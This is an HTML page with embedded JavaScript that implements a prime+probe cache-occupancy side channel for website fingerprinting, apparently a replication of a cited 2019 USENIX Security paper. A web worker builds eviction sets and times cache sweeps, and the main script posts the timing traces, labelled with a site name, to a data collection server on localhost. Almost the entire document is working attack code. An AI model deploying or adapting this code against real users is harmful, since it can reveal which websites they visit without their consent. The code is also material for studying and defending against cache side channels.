<html lang="en">

<!--   @inproceedings{DBLP:conf/uss/ShustermanKHMMO19,
  author    = {Anatoly Shusterman and
               Lachlan Kang and
               Yarden Haskal and
               Yosef Meltser and
               Prateek Mittal and
               Yossi Oren and
               Yuval Yarom},
  title     = {Robust Website Fingerprinting Through the Cache Occupancy Channel},
  booktitle = {{USENIX} Security Symposium},
  pages     = {639--656},
  publisher = {{USENIX} Association},
  year      = {2019}
} -->

<head>
    <title>blyat</title>

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

    <script>
        // general constants/
        const COLLECTION_SERVER_URL = "http://localhost:8080/CyberCyber"; // Data Collection Server address
        const TAG = "Cache-Contention-Trace";
    </script>


    <script id="workerSource"> type = "javascript/worker" >
        // worker constants
        0; // otherwise VSCode complains...

    const MEASUREMENT_TIME_IN_MS = 30000;

    const NUM_OF_SAMPLES = 3750;
    const EDGE_RESOLUTION = 0.1; // in ms

    const SAMPLING_PERIOD_IN_MS = 8;
    const SET_SKIPPING_STEP = 2;

    const CACHE_SETS = 16384;
    const CACHE_WAYS = 16; // 8MB on my iMac

    const BYTES_PER_MB = 1024 * 1024;
    const SETS_PER_PAGE = 64;

    const COUNT_SWEEPS = false; // if false, measure time. if true, measure how many cache sweeps we get until the clock changes
    const INTERPOLATED_MEASUREMENT = false; // if true, perform the interpolated measurement instead of the regular one
    // Prime and probe object
    function PrimeProbe(sets, ways) {
        this.evictionArray = new Uint32Array(32 * BYTES_PER_MB / Uint32Array.BYTES_PER_ELEMENT);
        this.setHeads = new Array(SETS_PER_PAGE);

        this.probeSet = function (setOffset) {
            //let elementsWentOver = 0;
            // Go over all elements in the set
            let pointer = this.setHeads[setOffset];
            let listHead = pointer;
            do {
                // elementsWentOver++;
                pointer = this.evictionArray[pointer];
            } while (pointer !== listHead);

            // console.log("Went over " + elementsWentOver + " elements.");
            return pointer;
        }

        this.probeSetLimited = function (setOffset, hops) {
            //let elementsWentOver = 0;
            // Go over all elements in the set
            let pointer = this.setHeads[setOffset];
            let listHead = pointer;
            do {
                // elementsWentOver++;
                pointer = this.evictionArray[pointer];
                hops--;
            } while ((hops !== 0) && (pointer !== listHead));

            // console.log("Went over " + elementsWentOver + " elements.");
            return pointer;
        }

        this.probeSets = function (sets) {
            // Probe some of the sets in the page
            for (setOffset in sets) {
                this.probeSet(sets[setOffset]);
            }
        }

        this.probeAllSets = function () {
            for (let set = 0; set < SETS_PER_PAGE; set += SET_SKIPPING_STEP) {
                this.probeSet(set);
            }
        }

        this.shuffle = function (arrayToShuffle) {
            let tmp, current, top = arrayToShuffle.length;
            if (top) while (--top) {
                current = Math.floor(Math.random() * (top + 1));
                tmp = arrayToShuffle[current];
                arrayToShuffle[current] = arrayToShuffle[top];
                arrayToShuffle[top] = tmp;
            }
            return arrayToShuffle;
        }

        this.createSetHeads = function (sets, ways) {
            // We have 64 set heads, each should to a list of size 128*[ways]=1536
            let unshuffledArray = new Uint32Array(sets / SETS_PER_PAGE);
            let allSetOffset = Math.log2(sets) + 4; // 17 for sets=8192, 16 for sets=4096

            let i;
            for (i = 0; i < unshuffledArray.length; i++) {
                unshuffledArray[i] = i;
            }

            // Shuffle the array
            let shuffledArray = this.shuffle(unshuffledArray);

            // Now write into the eviction buffer
            // virtual address is:
            // LLL LEEE EEEE SSSS SS00 00[00] (last 2 bits are because of UINT32 vs BYTE)
            //               ^^^^ ^^ - these 6 bits determine the set index, 64 possible values
            //               ^^^^ ^^^^ ^^ ^^ - these 12 bits (4K) are the same in physical and in virtual
            //      ^^^ ^^^^ we keep the set and change these 6/7 bits to 64/128 different values to cover all 8192=128*64 sets
            // ^^^ ^  - we use 12/16 different values for this to touch each set 12/16 times, once per line
            let set_index, element_index, line_index;
            let currentElement, nextElement;
            for (set_index = 0; set_index < SETS_PER_PAGE; set_index++) {
                currentElement = (shuffledArray[0] << 10) + (set_index << 4);
                this.setHeads[set_index] = currentElement;
                for (line_index = 0; line_index < ways; line_index++) {
                    //currentElement = (line_index << 17) + (shuffledArray[0] << 10) + (set_index << 4);

                    for (element_index = 0; element_index < sets / SETS_PER_PAGE - 1; element_index++) {
                        nextElement = (line_index << allSetOffset) + (shuffledArray[element_index + 1] << 10) + (set_index << 4);
                        this.evictionArray[currentElement] = nextElement;
                        currentElement = nextElement;
                    } // element
                    if (line_index === ways - 1) {
                        // In the last line, the last pointer goes to the head of the entire set
                        nextElement = this.setHeads[set_index];
                    } else {
                        // Last pointer goes back to the head of the next line
                        nextElement = ((line_index + 1) << allSetOffset) + (shuffledArray[0] << 10) + (set_index << 4);
                    }
                    this.evictionArray[currentElement] = nextElement;
                    currentElement = nextElement;
                } // line
            } // set

        };

        this.createSetHeads(sets, ways);

        // check that this doesn't crash/get stuck
        this.probeSets([1, 2, 3, 4, 5]);
    } // PP object.

    PP = new PrimeProbe(CACHE_SETS, CACHE_WAYS);
    let resultArray;
    // if(INTERPOLATED_MEASUREMENT === true)
    //     resultArray = new Array(NUM_OF_SAMPLES);
    // else
    //     resultArray = new Array(Math.ceil(MEASUREMENT_TIME_IN_MS / SAMPLING_PERIOD_IN_MS));

    resultArray = new Array(Math.ceil(MEASUREMENT_TIME_IN_MS / SAMPLING_PERIOD_IN_MS)+1); // +1 to record total time taken


    function performMeasurement() {
        // For each measurement period
        let measurement_index, busySpins = 0;
        let nextMeasurementStartTime = performance.now(), currentTime;


        nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;

        // Spin until we're ready for the next measurement
        do {
            currentTime = performance.now();
        }
        while (currentTime < nextMeasurementStartTime);

        for (measurement_index = 0; measurement_index < resultArray.length; measurement_index++) {

            nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;
            currentTime = performance.now();

            // if we've run out of time, skip the measurement
            if (currentTime >= nextMeasurementStartTime) {
                if (COUNT_SWEEPS === true) {
                    resultArray[measurement_index] = 0;
                } else {
                    resultArray[measurement_index] = SAMPLING_PERIOD_IN_MS * 3; // Some arbitrarily high value...
                }
            } else {
                if (COUNT_SWEEPS === true) {
                    let sweeps = 0;
                    // repeatedly perform the measurement until the clock changes
                    do {
                        currentTime = performance.now();
                        sweeps++;
                        PP.probeAllSets();
                    } while (currentTime < nextMeasurementStartTime);
                } else {
                    // otherwise, perform the measurement
                    PP.probeAllSets();
                }
                // log how many spins it took until the clock ticked again
                if (COUNT_SWEEPS === true) {
                    // log how many spins it took until the clock ticked again
                    resultArray[measurement_index] = sweeps;
                } else {
                    resultArray[measurement_index] = performance.now() - currentTime;
                }
                // Prepare for the next measurement
                do {
                    currentTime = performance.now();
                }
                while (currentTime < nextMeasurementStartTime);
            }
        }
    }


        function performWindowedMeasurement_NoSweeps(interpolated = true) {
        // For each measurement period
        let measurement_index = 0;
        let nextMeasurementStartTime = performance.now();
        let globalMeasurementStart = performance.now();
        let currentTime;
        // Spin until we're ready for the next measurement
        do {
            currentTime = performance.now();
        }
        while (currentTime === nextMeasurementStartTime);

        for (measurement_index = 0; measurement_index < resultArray.length; measurement_index++) {
            nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;
            currentTime = performance.now();
            // if we've run out of time, skip the measurement
            if (currentTime >= nextMeasurementStartTime) {
                resultArray[measurement_index] = [SAMPLING_PERIOD_IN_MS * 3,0]; // Some arbitrarily high value...

            } else {
                if(interpolated === true){
                    let count = 0;
                    let start = performance.now();
                    PP.probeAllSets();
                    let end = performance.now();
                    while(performance.now() === end){
                        count++;
                    }
                    resultArray[measurement_index] = [end-start, count];

                }
                else{ //Not interpolated measurement 
                    PP.probeAllSets();
                    resultArray[measurement_index] = performance.now() - currentTime;
                }
                // log how many spins it took until the clock ticked again
                // Prepare for the next measurement
                do {
                    currentTime = performance.now();
                }
                while (currentTime < nextMeasurementStartTime);
            }
        }
        resultArray[resultArray.length - 1] = performance.now() - globalMeasurementStart; //record total time taken
    }



    function coolDownXEdges(numOfEdges) {
        let target = performance.now() + numOfEdges * EDGE_RESOLUTION; // 0.1ms per edge
        while (performance.now() <= target) { }
    }

    function preform_Not_WindowedInterpolatedMeasurement() {
        let globalMeasurementStart = performance.now();
        let currentTime;
        // Spin until we're ready for the next measurement
        do {
            currentTime = performance.now();
        }
        while (currentTime === globalMeasurementStart);
        for (let i = 0; i < NUM_OF_SAMPLES; i++) {
            let count = 0;
            let start = performance.now();
            PP.probeAllSets();
            let end = performance.now();
            do {
                count++;
            }while (end === performance.now());
            resultArray[i] = [end - start, count];
            coolDownXEdges(2); // Cool down for 0.2ms
        }
        resultArray[resultArray.length - 1] = performance.now() - globalMeasurementStart; //record total time taken

    }

    function preformInterpolatedMeasurementConstantWindows() {

        let timeArr = new Array(resultArray.length);
        let countTillEdgeArr = new Array(resultArray.length);

        let currentTime = performance.now();
        // Spin until we're ready for the next measurement
        do {
        }
        while (currentTime === performance.now());
                
        let nextMeasurementStartTime = performance.now();
        for (let i = 0; i < resultArray.length; i++) {
            nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;
            if(performance.now() >= nextMeasurementStartTime){
                timeArr[i] = SAMPLING_PERIOD_IN_MS * 3;
                countTillEdgeArr[i] = 0;
            }
            else{
                let count = 0;
                let start = performance.now();
                PP.probeAllSets();
                let end = performance.now();
                do {
                    count++;
                }while (end === performance.now());
                timeArr[i] = (end - start); // in ms
                countTillEdgeArr[i] = count;
            }
        }
        // Create tuples and store in resultArray
        for (let i = 0; i < resultArray.length; i++) {
            resultArray[i] = [timeArr[i], countTillEdgeArr[i]];
        }
    }

    // Sampling:
    onmessage = function (e) {
        // performWindowedMeasurement_NoSweeps();
        // preform_Not_WindowedInterpolatedMeasurement();
        // if (INTERPOLATED_MEASUREMENT === true)
        //     preformInterpolatedMeasurementConstantWindows();
        // else
        //     performMeasurement();

        // Send the result array back to the main page.


        let measurementType = e.data;
        
        if (measurementType === 'windowed') {
            performWindowedMeasurement_NoSweeps();
        } else if (measurementType === 'not_windowed') {
            preform_Not_WindowedInterpolatedMeasurement();
        } else {
            // Default behavior (keep existing logic)
            performWindowedMeasurement_NoSweeps();
        }
        postMessage(resultArray);
    }


    </script>

    <!-- ^^^ worker thread /////////////// vvv main code -->

    <!--script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> -->


    <script>
        let newURL = window.location.search;
        let site = newURL.split('?');

        function handleMessageFromWorker(msg) {
            // Send the result to our collection server using standard XHR
            // Source: http://jsfiddle.net/sstur/0mvmnxnb/
            let currdate = Date.now() + '';
            console.log(currdate + ': Thread returned: ' + msg.data);
            let xhr = new XMLHttpRequest();
            xhr.open('POST', COLLECTION_SERVER_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(
                {
                    CurrentDate: currdate,
                    Tag: TAG,
                    SiteName: site[1],
                    Cache_Probe: msg.data
                })
            );
        }

        let blob = new Blob([
            document.querySelector('#workerSource').textContent
        ], {type: "text/javascript"})
        let myWorker = new Worker(window.URL.createObjectURL(blob));
        myWorker.addEventListener('message', handleMessageFromWorker);
        console.log("Starting...")
        myWorker.postMessage(window.location.search.split("?"));
    </script>
</head>

<body>


</body>

</html>